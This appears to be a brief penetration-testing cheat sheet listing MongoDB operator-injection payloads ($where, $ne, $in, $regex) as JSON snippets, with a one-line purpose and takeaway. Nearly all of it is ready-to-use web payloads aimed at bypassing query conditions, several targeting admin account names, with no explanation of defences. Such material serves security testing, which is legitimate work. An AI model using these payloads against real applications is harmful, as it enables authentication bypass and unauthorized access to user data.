# MongoDB Operator Injection Payloads

## $where

```json
{
  "$where":"1"
}
```

---

## False Condition

```json
{
  "$where":"0"
}
```

---

## $ne

```json
{
  "$ne":"invalid"
}
```

---

## $in

```json
{
  "$in":["admin","administrator","superadmin"]
}
```

---

## $regex

```json
{
  "$regex":"admin.*"
}
```

---

# Purpose

Test whether MongoDB operators supplied by the user are processed by the application.

---

# Key Takeaways

- Operator injection manipulates query conditions without breaking syntax.